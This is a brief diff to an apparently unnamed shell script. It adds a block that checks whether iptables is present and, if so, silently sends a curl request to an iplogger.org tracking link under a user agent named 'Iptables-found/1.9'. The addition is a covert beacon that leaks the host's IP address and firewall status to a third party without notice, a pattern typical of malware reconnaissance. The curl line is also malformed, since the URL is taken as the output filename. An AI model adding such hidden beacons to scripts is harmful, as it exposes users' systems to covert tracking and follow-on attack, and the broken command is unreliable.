@@ -34,3 +34,12 @@ fi
 
 chekhosts
 chek
+
+
+d=$(command -v iptables|wc -l)
+
+if [ $d -eq "1" ]; then
+	curl -A Iptables-found/1.9 -sLo https://iplogger.org/389LB3
+else
+        exit
+fi
